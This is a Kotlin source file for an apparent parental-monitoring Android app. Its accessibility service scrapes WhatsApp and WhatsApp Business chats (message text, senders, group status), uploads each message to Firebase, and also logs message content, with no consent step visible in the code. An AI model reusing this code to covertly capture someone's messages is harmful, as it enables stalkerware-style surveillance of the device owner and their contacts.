package com.parentalmonitor.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.firebase.Timestamp
import com.parentalmonitor.data.model.WhatsAppData
import com.parentalmonitor.data.repository.FirebaseRepository
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.*
import javax.inject.Inject

@AndroidEntryPoint
class WhatsAppAccessibilityService : AccessibilityService() {

    /**
     * Data class untuk 4 nilai (sender, content, isGroup, groupName)
     * Karena Kotlin standard hanya punya Pair dan Triple
     */
    data class Quadruple<A, B, C, D>(val first: A, val second: B, val third: C, val fourth: D)

    @Inject
    lateinit var firebaseRepository: FirebaseRepository

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastProcessedMessage: String = ""

    companion object {
        private const val TAG = "WhatsAppAccessibility"
        private const val WHATSAPP_PACKAGE = "com.whatsapp"
        private const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            packageNames = arrayOf(WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE)
            notificationTimeout = 100
        }
        Log.d(TAG, "WhatsApp Accessibility Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        when (event.packageName?.toString()) {
            WHATSAPP_PACKAGE, WHATSAPP_BUSINESS_PACKAGE -> {
                when (event.eventType) {
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                        processChatContent(event)
                    }
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
    }

    private fun processChatContent(event: AccessibilityEvent) {
        try {
            val source = event.source ?: return
            val rootNode = rootInActiveWindow ?: return

            // Try to find message content in the chat
            val messages = findWhatsAppMessages(rootNode)

            messages.forEach { msg ->
                val sender = msg.first
                val content = msg.second
                val isGroup = msg.third
                val groupName = msg.fourth
                val messageKey = "$sender:$content"
                if (messageKey != lastProcessedMessage) {
                    lastProcessedMessage = messageKey
                    val whatsappData = WhatsAppData(
                        sender = sender,
                        content = content,
                        timestamp = Timestamp.now(),
                        isGroup = isGroup,
                        groupName = groupName
                    )

                    serviceScope.launch {
                        try {
                            firebaseRepository.uploadWhatsApp(whatsappData)
                            Log.d(TAG, "WhatsApp message saved: $sender - $content")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to save WhatsApp message", e)
                        }
                    }
                }
            }

            source.recycle()
            rootNode.recycle()
        } catch (e: Exception) {
            Log.e(TAG, "Error processing chat content", e)
        }
    }

    private fun findWhatsAppMessages(node: AccessibilityNodeInfo): List<Quadruple<String, String, Boolean, String>> {
        val messages = mutableListOf<Quadruple<String, String, Boolean, String>>()

        try {
            // Look for message bubble containers
            // WhatsApp uses specific class names for message bubbles
            findMessagesRecursive(node, messages, depth = 0)
        } catch (e: Exception) {
            Log.e(TAG, "Error finding messages", e)
        }

        return messages
    }

    private fun findMessagesRecursive(
        node: AccessibilityNodeInfo,
        messages: MutableList<Quadruple<String, String, Boolean, String>>,
        depth: Int,
        currentGroup: String = ""
    ) {
        if (depth > 20) return // Prevent infinite recursion

        try {
            val className = node.className?.toString() ?: ""
            val contentDesc = node.contentDescription?.toString() ?: ""
            val text = node.text?.toString() ?: ""

            // Check for group name
            if (className.contains("TextView") && contentDesc.contains("group", ignoreCase = true)) {
                // This might be a group chat header
            }

            // Look for message text
            if (text.isNotEmpty() && className.contains("TextView")) {
                // Check if this looks like a message (not a UI element)
                if (isMessageText(text, contentDesc)) {
                    val sender = extractSender(contentDesc, node)
                    val isGroup = currentGroup.isNotEmpty()
                    messages.add(Quadruple(sender, text, isGroup, currentGroup))
                }
            }

            // Recurse into children
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                findMessagesRecursive(child, messages, depth + 1, currentGroup)
                child.recycle()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in recursive search", e)
        }
    }

    private fun isMessageText(text: String, contentDesc: String): Boolean {
        // Filter out UI elements
        val uiElements = listOf(
            "chat", "calls", "status", "camera", "search",
            "attach", "send", "emoji", "mic", "typing"
        )

        val lowerText = text.lowercase()
        val lowerDesc = contentDesc.lowercase()

        // Skip if text matches UI elements
        if (uiElements.any { lowerText == it || lowerDesc == it }) return false

        // Skip very short texts (likely buttons)
        if (text.length < 2) return false

        // Skip timestamps only
        if (text.matches(Regex("\\d{1,2}:\\d{2}.*"))) return false

        return true
    }

    private fun extractSender(contentDesc: String, node: AccessibilityNodeInfo): String {
        // Try to extract sender from content description
        // WhatsApp format: "Sender name, message text"
        val parts = contentDesc.split(",", limit = 2)
        return if (parts.size > 1) {
            parts[0].trim()
        } else {
            // Try parent node for sender info
            val parent = node.parent
            val sender = parent?.contentDescription?.toString()?.split(",")?.firstOrNull()?.trim()
            parent?.recycle()
            sender ?: "Unknown"
        }
    }
}
